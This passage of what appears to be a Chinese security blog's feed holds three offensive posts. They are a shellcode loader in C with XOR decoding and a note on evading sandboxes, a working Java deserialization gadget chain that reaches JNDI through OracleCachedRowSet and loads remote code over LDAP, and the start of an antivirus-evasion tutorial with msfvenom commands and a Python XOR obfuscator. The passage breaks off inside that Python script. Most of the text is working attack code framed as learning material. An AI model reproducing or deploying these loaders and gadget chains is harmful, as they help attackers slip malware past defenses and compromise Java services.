内存页属性</span><br><span class="hljs-comment">/* length: 800 bytes */</span><br><br>    <span class="hljs-comment">// 获取shellcode大小</span><br>    shellcode_size = <span class="hljs-built_in">sizeof</span>(buf);<br><br>    <span class="hljs-comment">/* 增加异或代码 */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_size; i++) &#123;<br>        <span class="hljs-comment">//buf[i] ^= 10;</span><br>        _InterlockedXor8(buf + i, <span class="hljs-number">10</span>);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    VirtualAlloc(</span><br><span class="hljs-comment">        NULL, // 基址</span><br><span class="hljs-comment">        800,  // 大小</span><br><span class="hljs-comment">        MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">        );</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">char</span>* shellcode = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        shellcode_size,<br>        MEM_COMMIT,<br>        PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>    );<br><br><br>    <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br>    <span class="hljs-built_in">CopyMemory</span>(shellcode, buf, shellcode_size);<br><br>    <span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>    <span class="hljs-built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);<br><br>    <span class="hljs-comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span><br><br>    hThread = <span class="hljs-built_in">CreateThread</span>(<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>        (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>        &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://rvn0xsy.github.io/">https://rvn0xsy.github.io</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>新jdk原生入口到jndi</title>
    <link href="/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/"/>
    <url>/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/</url>
    
    <content type="html"><![CDATA[<p>首发先知 <a href="https://xz.aliyun.com/t/14732">https://xz.aliyun.com/t/14732</a></p><h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01  起因"></a>0x01  起因</h2><p>​tj哥在调试某1day时，想找其他的触发点，最后找到了oracle数据库的jndi。</p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>OracleCachedRowSet#getConnectionInternal</p><p><img src="image-20240603204410886.png" alt="image-20240603204410886"></p><p>这里直接new了一个InitialContext<img src="image-20240523154007471.png" alt="image-20240523154007471"></p><p><img src="image-20240523154030734.png" alt="image-20240523154030734"></p><p>然后进行了lookup，然后触发。</p><p>oracle.jdbc.rowset.OracleRowSet#getDataSourceName</p><p><img src="image-20240523154110189.png" alt="image-20240523154110189"></p><p>可以看到是直接获取这个属性。可控。</p><p><img src="image-20240726114157046.png" alt="image-20240726114157046"></p><p>抽象类，可序列化</p><p><img src="image-20240523154307368.png" alt="image-20240523154307368"></p><p>oracle.jdbc.rowset.OracleCachedRowSet#getConnection 这个方法直接调用。</p><p>那种想到需要触发OracleCachedRowSet的getter()方法就能触发。</p><h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> oracle.jdbc.rowset.OracleCachedRowSet;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Oracle</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br><br><br><span class="hljs-comment">//        Field dataSourceName_1 = OracleCachedRowSet.class.getSuperclass().getDeclaredField(&quot;dataSourceName&quot;); dataSourceName_1.setAccessible(true); dataSourceName_1.set(oracleCachedRowSet, &quot;ldap://127.0.0.1:4444/dc=example,dc=com&quot;);</span><br>        oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/remoteExploit8&quot;</span>);<br>        oracleCachedRowSet.getConnection();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240726114207978.png" alt="image-20240726114207978"></p><p>日常jndi招呼计算器。</p><h2 id="0x04-gadget"><a href="#0x04-gadget" class="headerlink" title="0x04 gadget"></a>0x04 gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Oracle</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dataSourceName_1</span> <span class="hljs-operator">=</span> OracleCachedRowSet.class.getSuperclass().getDeclaredField(<span class="hljs-string">&quot;dataSourceName&quot;</span>);<br>        dataSourceName_1.setAccessible(<span class="hljs-literal">true</span>);<br>        dataSourceName_1.set(oracleCachedRowSet, <span class="hljs-string">&quot;ldap://127.0.0.1:1389/remoteExploit8&quot;</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        v1.add(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;111&quot;</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        v2.add(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;222&quot;</span>);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;metaData&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>&#125;);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;matchColumnNames&quot;</span>, v1);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;matchColumnIndexes&quot;</span>, v2);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;monitorLock&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(oracleCachedRowSet);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        utils.setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, node);<br>        <span class="hljs-type">byte</span>[] serialize = utils.serialize(badAttributeValueExpException);<br>        utils.unserialize(serialize);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="image-20240523170745040.png" alt="image-20240523170745040"></p><p>招呼计算器成功</p><h2 id="0x05-jdk原生gadget"><a href="#0x05-jdk原生gadget" class="headerlink" title="0x05 jdk原生gadget"></a>0x05 jdk原生gadget</h2><p>​那要是常见触发tostring的类（若badAttributeValueExpException）被搬掉了，没别的依赖。</p><p>所以现在需要找一条新的tostring。</p><p>javax.swing.UIDefaults.TextAndMnemonicHashMap</p><p><img src="image-20240726114221015.png" alt="image-20240726114221015"></p><p>可以看到是map,然后调用了key的tostring，非常完美。</p><p>java.util.AbstractMap#equals</p><p><img src="image-20240521204924499.png" alt="image-20240521204924499"></p><p>m是一个map，改成javax.swing.UIDefaults.TextAndMnemonicHashMap就可以走通，非常合理，java.util.AbstractMap是一个抽象类，所以我们只要找一个继承它又没有实现equals的方法就行了,感觉非常多了，haspmap，hashtable都可以。</p><h3 id="hashtable触发tostring"><a href="#hashtable触发tostring" class="headerlink" title="hashtable触发tostring"></a>hashtable触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTableTstring</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o,<span class="hljs-string">&quot;Unam4&quot;</span>);<br>    tHashMap2.put(o,<span class="hljs-string">&quot;SpringKill&quot;</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    hashtable.put(tHashMap1,<span class="hljs-string">&quot;Unam4&quot;</span>);<br>    hashtable.put(tHashMap2,<span class="hljs-string">&quot;SpringKill&quot;</span>);<br><br>    tHashMap1.put(o, <span class="hljs-literal">null</span>);<br>    tHashMap2.put(o, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hashmap触发tostring"><a href="#hashmap触发tostring" class="headerlink" title="hashmap触发tostring"></a>hashmap触发tostring</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmapToString</span><span class="hljs-params">(Object o1, Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o1,<span class="hljs-literal">null</span>);<br>    tHashMap2.put(o2,<span class="hljs-literal">null</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    utils.setFieldValue(hashMap, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>    Array.set(arr, <span class="hljs-number">0</span>, node1);<br>    Array.set(arr, <span class="hljs-number">1</span>, node2);<br>    utils.setFieldValue(hashMap, <span class="hljs-string">&quot;table&quot;</span>, arr);<br>    <span class="hljs-keyword">return</span> hashMap;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Hashtable触发equals"><a href="#Hashtable触发equals" class="headerlink" title="Hashtable触发equals"></a>Hashtable触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTable</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    utils.setFieldValue(hashtable,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    nodeC = Class.forName(<span class="hljs-string">&quot;java.util.Hashtable$Entry&quot;</span>);<br><br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;Unam4&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;Springkill&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(hashtable, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="HashMap-触发equals"><a href="#HashMap-触发equals" class="headerlink" title="HashMap 触发equals"></a>HashMap 触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>    &#125;<br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ConcurrentHashMap触发equals"><a href="#ConcurrentHashMap触发equals" class="headerlink" title="ConcurrentHashMap触发equals"></a>ConcurrentHashMap触发equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConcurrentHashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeConcurrentMap</span><span class="hljs-params">(Object o, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>     ConcurrentHashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;sizeCtl&quot;</span>, <span class="hljs-number">2</span>);<br>     Class&lt;?&gt; nodeC;<br>     <span class="hljs-keyword">try</span> &#123;<br>         nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>     &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>         nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>     &#125;<br>     Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>     nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>     Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-literal">null</span>));<br>     Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-literal">null</span>));<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>     <span class="hljs-keyword">return</span> s;<br> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态恶意代码逃逸学习(1)</title>
    <link href="/2024/06/03/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/"/>
    <url>/2024/06/03/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​2024，代码审计+渗透测试已经满足不了市场，所以准备花几个月学免杀，虽然以前写一个一些免杀，但是好久没用上。so，这次就从头开始。</p><h2 id="0x02-Shellcode定义"><a href="#0x02-Shellcode定义" class="headerlink" title="0x02 Shellcode定义"></a>0x02 Shellcode定义</h2><p>​Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。</p><h2 id="0x03-RAW文件"><a href="#0x03-RAW文件" class="headerlink" title="0x03 RAW文件"></a>0x03 RAW文件</h2><p>​RAW 中文意思是原始的、未经加工的，RAW文件是可以直接进行字节操作读取的，我本地直接使用msf生成。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p windows/exec CMD=calc.exe -f raw &gt;calc.bin &amp;&amp; cat calc.bin<br></code></pre></td></tr></table></figure><p><img src="image-20240603100824843.png" alt="image-20240603100824843"></p><h2 id="0x04-C文件"><a href="#0x04-C文件" class="headerlink" title="0x04 C文件"></a>0x04 C文件</h2><p>​C文件给出的是一个C语言中的字符数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">msfvenom -p windows/exec CMD=calc.exe -f c<br></code></pre></td></tr></table></figure><p><img src="image-20240603101855811.png" alt="image-20240603101855811"></p><h2 id="0x05-混淆"><a href="#0x05-混淆" class="headerlink" title="0x05 混淆"></a>0x05 混淆</h2><p>​由于反病毒软件对于默认生成的文件查杀较为严格，这里写个简单的混淆脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_xor</span>(<span class="hljs-params">bytearray_data, xor_key, output_file=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bytearray_data)):<br>        bytearray_data[i] ^= xor_key<br>    <span class="hljs-keyword">if</span>  output_file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(bytearray_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-built_in">type</span>=FileType(<span 